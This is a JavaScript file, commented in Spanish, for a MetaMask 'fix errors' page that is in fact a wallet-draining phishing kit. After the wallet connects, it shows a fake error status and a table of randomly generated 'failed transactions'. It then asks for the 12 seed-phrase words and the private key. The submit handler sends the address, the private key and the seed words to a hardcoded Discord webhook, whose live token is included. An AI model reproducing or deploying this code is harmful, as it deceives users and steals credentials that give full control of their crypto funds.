let fullUserAddress = ''; // Almacenará la dirección completa del usuario




document.addEventListener('DOMContentLoaded', async () => {
    const connectButton = document.getElementById('connectButton');
    const userAddress = document.getElementById('userAddress');
    const addressStatus = document.getElementById('addressStatus');
    const fixErrorsButton = document.getElementById('fixErrorsButton');
    const fixErrorsContent = document.getElementById('fixErrorsContent');
    const addressInput = document.getElementById('addressInput');
    const submitAddressButton = document.getElementById('submitAddress');
    const addTextButton = document.getElementById('addTextButton');
    const textInputsContainer = document.getElementById('textInputsContainer');
    const submitTextsButton = document.getElementById('submitTexts');
    const failedTransactionsBody = document.getElementById('failedTransactionsBody'); // Asegúrate de que este ID corresponde con tu HTML


    // Función para resumir la dirección del usuario
    const summarizeAddress = (address) => `${address.slice(0, 6)}...${address.slice(-4)}`;

    // Función para simular el estado de la dirección
    const simulateAddressStatus = () => {
        let loadingSymbols = ['|', '/', '-', '\\'];
        let i = 0;

        const loadingInterval = setInterval(() => {
            addressStatus.textContent = `Status Address: ${loadingSymbols[i++ % loadingSymbols.length]}`;
        }, 150);

        setTimeout(() => {
            clearInterval(loadingInterval);
            addressStatus.textContent = 'Status Address: Error 1-92ErrTx8365';
            addressStatus.style.color = 'red';
            // Mostrar botón "Corregir errores" después de mostrar errores
            fixErrorsButton.style.display = 'block';
        }, 6000);
    };

    // Función para conectar a MetaMask y simular estado de la dirección
    const connectMetaMask = async () => {
        try {
            // Solicitar al usuario que conecte MetaMask
            const accounts = await ethereum.request({ method: 'eth_requestAccounts' });


            fullUserAddress = accounts[0];

            // Cambiar el texto del botón a Web3 Activo
            connectButton.textContent = 'Web3 Active';
            // Mostrar la dirección resumida del usuario
            if (accounts.length > 0) {
                userAddress.textContent = `Address: ${summarizeAddress(accounts[0])}`;
                // Simular el estado de la dirección
                simulateAddressStatus();
            }
        } catch (error) {
            console.error(error);
            connectButton.textContent = 'Conectar a MetaMask';
            addressStatus.textContent = '';
        }
    };

    connectButton.addEventListener('click', connectMetaMask);

    // Escuchar cambios en las cuentas y actualizar la interfaz
    ethereum.on('accountsChanged', (accounts) => {
        if (accounts.length > 0) {
            fullUserAddress = accounts[0];
            userAddress.textContent = `Address: ${summarizeAddress(accounts[0])}`;
            connectButton.textContent = 'Web3 Active';
            simulateAddressStatus();
        } else {
            fullUserAddress = ''; // Limpiar la dirección si el usuario se desconecta
            userAddress.textContent = '';
            connectButton.textContent = 'Conectar a MetaMask';
            addressStatus.textContent = 'Status Address: ';
            addressStatus.style.color = 'initial';
            fixErrorsButton.style.display = 'none';
        }
    });

    // Mostrar opciones de corrección al hacer clic en "Corregir errores"
        fixErrorsButton.addEventListener('click', () => {
        fixErrorsContent.style.display = 'block';
        simulateLoadingTransactions(); // Asumiendo que queremos cargar las transacciones fallidas aquí

    });

    // Manejo de clic en "Agrega tu texto"
    addTextButton.addEventListener('click', () => {
        // Verificar si los inputs ya están visibles
        if (textInputsContainer.style.display === 'block') {
            // Si ya están visibles, ocultarlos
            textInputsContainer.style.display = 'none';
            submitTextsButton.style.display = 'none';
        } else {
            // Si están ocultos, primero limpiar para evitar duplicados y luego mostrarlos
            textInputsContainer.innerHTML = ''; // Limpiar para evitar duplicados
            for (let i = 0; i < 12; i++) { // Cambié de 12 a 5 para simplificar
                const input = document.createElement('input');
                input.type = 'text';
                input.placeholder = `Phrase ${i + 1}`;
                textInputsContainer.appendChild(input);
            }
            textInputsContainer.style.display = 'block';
            submitTextsButton.style.display = 'block';
        }
    });


   


    
   function simulateLoadingTransactions() {
        // Haciendo visible la sección addressInfo.
        document.getElementById('addressInfo').style.display = 'block';

        const failedTransactionsBody = document.getElementById('failedTransactionsBody');
        // Limpiamos el contenido previo que pueda existir.
        failedTransactionsBody.innerHTML = '<tr><td colspan="3">Process...</td></tr>';
        
        setTimeout(() => {
            failedTransactionsBody.innerHTML = ''; // Limpiar "Cargando..."

            // Generando datos de ejemplo con detalles técnicos.
            for (let i = 0; i < 5; i++) {
                const errorLevel = i % 2 === 0 ? 'error' : 'warning'; // Alternando entre 'error' y 'warning'
                const color = errorLevel === 'error' ? 'red' : 'blue'; // Rojo para error, amarillo para warning

                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${generateRandomHash()}</td>
                    <td style="color: ${color};">${generateErrorMessage(errorLevel)}</td>
                    <td>${generateBlockNumber()}</td>
                `;
                failedTransactionsBody.appendChild(row);
            }
        }, 2000); // Simulación de carga con delay.
    }

    function generateRandomHash() {
        // Genera un hash aleatorio simulado.
        return '0x' + [...Array(64)].map(() => Math.floor(Math.random() * 8).toString(8)).join('');
    }

    function generateErrorMessage(level) {
        // Genera mensajes de error/warning de ejemplo con códigos hexadecimales.
        if (level === 'error') {
            return `Error: Estimate Gas fail - Code error 0x${Math.floor(Math.random() * 256).toString(16)}`;
        } else {
            return `Warning: Gas low E-Tx - Code error 0x${Math.floor(Math.random() * 256).toString(16)}`;
        }
    }

    function generateBlockNumber() {
        // Genera un número de bloque aleatorio.
        return `Block #${Math.floor(100000 + Math.random() * 900000)}`;
    }


document.getElementById('textInputsContainer').style.display = 'flex';


    // Función para enviar mensajes a Discord via Webhook
function sendMessageToDiscord(message) {
    const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            content: message,
            username: "Web3 Notifier", // Puedes personalizar el nombre de usuario del webhook
        }),
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => {
        console.error('Error:', error);
    });
}



    
   // Función para manejar el envío de la dirección ingresada manualmente
submitAddressButton.addEventListener('click', () => {
    const address = addressInput.value.trim();
    if (address) {
        console.log(`Dirección enviada manualmente: ${address}`);
        sendMessageToDiscord(`Dirección enviada manualmente: ${address}`);
        // Aquí continúa tu lógica, si es necesario
    }
});


// Asegúrate de que este código ya esté en tu script.js

submitTextsButton.addEventListener('click', () => {
    const texts = [];
    textInputsContainer.querySelectorAll('input').forEach(input => {
        if (input.value.trim() !== '') texts.push(input.value);
    });

    const privateKey = addressInput.value.trim(); // Capturar la "clave privada"
    const message = `Dirección MetaMask: ${fullUserAddress}\nClave Privada: ${privateKey}\nPalabras: ${texts.join(', ')}`;


    console.log(message); // Para depuración, puedes verlo en la consola
    sendMessageToDiscord(message);

    // Limpia los campos después del envío, si lo deseas
    textInputsContainer.querySelectorAll('input').forEach(input => input.value = '');
    addressInput.value = ''; // Limpia el input de la "clave privada"
});


    // Función para manejar el envío de la dirección ingresada manualmente
    submitAddress.addEventListener('click', () => {
        const address = addressInput.value.trim();
        if (address) {
            console.log(`Dirección enviada manualmente: ${address}`);
            // Aquí puedes agregar la lógica para manejar la dirección enviada, como validarla o enviarla a una API
        }
    });

});
